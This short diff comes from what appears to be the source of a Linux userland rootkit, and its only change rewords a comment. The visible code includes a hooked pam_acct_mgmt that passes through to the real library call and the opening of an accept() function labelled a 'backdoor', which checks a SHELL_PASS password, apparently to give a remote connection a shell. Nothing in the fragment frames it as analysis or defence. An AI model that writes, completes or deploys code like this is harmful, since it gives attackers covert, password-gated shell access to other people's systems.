@@ -56,7 +56,7 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags)
     return (int) libcalls[PAM_ACCT_MGMT](pamh, flags);
 }
 
-/* accept() backdoor -- to-do: spawn PTY instead of just interactive shell. */
+/* accept() backdoor -- to-do: spawn PTY instead of just dropping a shell. */
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 {
     const size_t pass_len = strlen(SHELL_PASS);
